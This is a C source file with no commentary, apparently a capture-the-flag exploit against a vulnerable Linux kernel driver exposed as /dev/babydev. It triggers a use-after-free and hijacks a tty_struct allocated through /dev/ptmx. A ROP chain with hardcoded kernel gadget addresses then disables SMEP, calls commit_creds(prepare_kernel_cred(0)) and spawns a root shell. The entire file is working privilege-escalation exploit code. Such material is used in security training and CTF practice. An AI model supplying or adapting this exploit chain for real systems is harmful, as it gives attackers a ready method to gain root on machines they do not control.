#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<sys/ioctl.h>
#include<stdlib.h>
#include<unistd.h>
#include<stdio.h>

#define prepare_kernel_cred_addr  0xffffffff810a1810
#define commit_creds_addr 0xffffffff810a1420

void get_root(){
    char* (*pck)(int) = prepare_kernel_cred_addr;
    char* (*cc)(char *) = commit_creds_addr;
    (*cc)((*pck)(0));
}

void spawn_shell(){
    if(!getuid()){
        system("/bin/sh");
    }else
        puts("get shell failed!");
    exit(0);
}

size_t user_cs,user_ss,user_eflags,user_sp;
void save_status(){
    asm(
       "movq %%cs, %0;" 
       "movq %%ss, %1;" 
       "movq %%rsp, %3;" 
       "pushfq;"
       "popq %2;"
       : "=r"(user_cs),"=r"(user_ss),"=r"(user_eflags),"=r"(user_sp)
       :
       : "memory"
    );
    puts("[*]save status.\n");
}

int main(void){
    save_status();
    // uaf
    int fd1 = open("/dev/babydev",O_RDWR);
    int fd2 = open("/dev/babydev",O_RDWR);
    if (fd1 == -1 || fd2 == -1){
        puts("open babydev failed!\n");
        return -1;
    }
    ioctl(fd1,0x10001,0x2e0);
    close(fd1);
    puts("UAF\n");
    // fake_tty_struct,fake_tty_options
    int fd = open("/dev/ptmx",O_RDWR); //this.tty_struct = fd2.baby_struct
    if(fd == -1){
        puts("open ptmx failed!\n");
        return -1;
    }
    size_t fake_tty_struct[4] = {0};
    size_t *fake_tty_opts[30] = {0}; //rop gadgets
    read(fd2,fake_tty_struct,0x20);
    fake_tty_struct[3] = fake_tty_opts;
    write(fd2,fake_tty_struct,0x20);
    // layout rop
    size_t rop[20] = {0};
    size_t mov_rsprax = 0xffffffff8181bfc5;//mov rsp,rax;dec ebx;ret
    size_t pop_rsp = 0xffffffff81002052; //pop rsp;pop rbp;ret
    size_t pop_rdi = 0xffffffff81002810; //pop rdi;pop rbp;ret
    size_t mov_cr4 = 0xffffffff81004d80; //mov cr4,rdi;pop rbp; ret
    size_t swapgs = 0xffffffff81063694; //swapgs;pop rbp;ret
    size_t iretq = 0xffffffff812b9401; //iretq
    fake_tty_opts[7] = mov_rsprax; // rsp->fake_tty_ops
    fake_tty_opts[0] = pop_rsp;
    fake_tty_opts[1] = rop; 
    rop[0] = 0;
    rop[1] = pop_rdi;
    rop[2] = 0x6f0;
    rop[3] = 0;
    rop[4] = mov_cr4;
    rop[5] = 0;
    rop[6] = (size_t *)get_root;
    rop[7] = swapgs;
    rop[8] = 0;
    rop[9] = iretq;
    rop[10] = (size_t *)spawn_shell;
    rop[11] = user_cs;
    rop[12] = user_eflags;
    rop[13] = user_sp;
    rop[14] = user_ss;
    char buf[0x10] = {0};
    write(fd,buf,0x10);// trigger rop
    return 0;
}
